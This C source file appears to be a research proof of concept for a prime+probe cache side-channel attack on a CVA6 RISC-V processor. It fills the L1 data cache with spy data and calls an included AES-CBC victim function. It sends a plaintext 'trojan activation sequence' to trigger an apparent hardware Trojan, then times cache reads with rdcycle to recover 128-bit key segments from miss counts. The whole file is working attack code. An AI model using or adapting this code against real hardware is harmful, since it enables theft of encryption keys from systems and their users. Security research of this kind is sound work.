#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/time.h>

#include "victim.c"

#define CACHE_SIZE 32768/16  					// CVA6 L1 data cache size / manipulated data size in bytes
#define THRESHOLD 30 							// threshold between cache miss and cache hit
#define SAMPLES 2000							// number of prime followed by a probe
#define PRIME_COUNT 1							// number of prime before the probe
#define SIZE_ENCODING 128						// size known by the Trojan which describes the number of bits per trace
#define keyLength 128							// encryption key length in bits that we want to retrieve
#define ITERATION keyLength/SIZE_ENCODING		// number of traces needed to retrieve an entire key

/* ========================== DATA DECLARATION ========================= */

// variable used to read a value during the prime because of the no-write-allocate policy
__uint128_t spyVar = 50 ;

// array filled by the probe time at each array index
volatile unsigned probeTime[CACHE_SIZE];

// array filled by the number of cache miss at each array index
volatile unsigned miss[CACHE_SIZE] = {0};

// plainText argument for cipher function
uint8_t plainText[] = { 0xf5, 0x8c, 0x4c, 0x04, 0xd6, 0xe5, 0xf1, 0xba, 0x77, 0x9e, 0xab, 0xfb, 0x5f, 0x7b, 0xfb, 0xd6,
                      	0x9c, 0xfc, 0x4e, 0x96, 0x7e, 0xdb, 0x80, 0x8d, 0x67, 0x9f, 0x77, 0x7b, 0xc6, 0x70, 0x2c, 0x7d,
                      	0x39, 0xf2, 0x33, 0x69, 0xa9, 0xd9, 0xba, 0xcf, 0xa5, 0x30, 0xe2, 0x63, 0x04, 0x23, 0x14, 0x61,
                      	0xb2, 0xeb, 0x05, 0xe2, 0xc3, 0x9b, 0xe9, 0xfc, 0xda, 0x6c, 0x19, 0x07, 0x8c, 0x6a, 0x9d, 0x1b };


/* ========================== PRINT FUNCTIONS  =========================== */

// print the value of probe time at each array index
void printTime(){
    for(int i=0 ; i< CACHE_SIZE ; i++) {
            printf("%i : %u\n", i, probeTime[i]) ;
    }
}

// print the number of cache miss at each array index
void printCacheMiss(){
	for(int i=0 ; i< CACHE_SIZE ; i++) {
        printf("%i : %u\n", i, miss[i]) ;
    }
}


/* ==================== PRIME FUNCTIONS ================================== */

// fill data cache with spy values
void prime(__uint128_t *data) {
    for (int j = 0 ; j < PRIME_COUNT ; j++) {
        for (int i = 0 ; i < CACHE_SIZE ; i++) {
            data[i] = 152463535 ;
			spyVar = data[i] ;
        }
    }
}

/* ==================== PROBE FUNCTIONS ================================= */

void probe(__uint128_t *data) {
	unsigned time, t1, t2;
	for (int i=0 ; i < CACHE_SIZE ; i++) {
		asm volatile ("rdcycle %0" : "=r" (t1));				// stopwatch
		__uint128_t  y = data[i] ;								// read data
		asm volatile ("rdcycle %0" : "=r" (t2));				// stopwatch
		time = t2 - t1;
		//probeTime[i] = time ;
		if(time > THRESHOLD) {									// if time to read a value is superior to a treshold
			miss[i] = miss[i] + 1;								// cache miss counter incremented at this index
		}
 	}
}

int main() {
	for (int i = 0 ; i < ITERATION ; i++) {
		// cache miss counter reset
		for(int k = 0 ; k < CACHE_SIZE ; k++){
			miss[k] = 0 ;
		}
		for (int l = 0; l < SAMPLES ; l++){
			// plainText modification 
			for (int j = 0 ; j < 10 ; j++){
				// trojan activation sequence
				plainText[j] = j*4 ;
			}
			// indicates to trojan the part of key to leak
			plainText[10] = i*SIZE_ENCODING ;														

			// array manipuled by spy
			__uint128_t spyData[CACHE_SIZE] __attribute__((aligned(128)));		

			prime(spyData);
			aes_encrypt_cbc(plainText);				//call victim function
			probe(spyData);
		}

		printCacheMiss();
		//printTime();
	}
	return 0;
}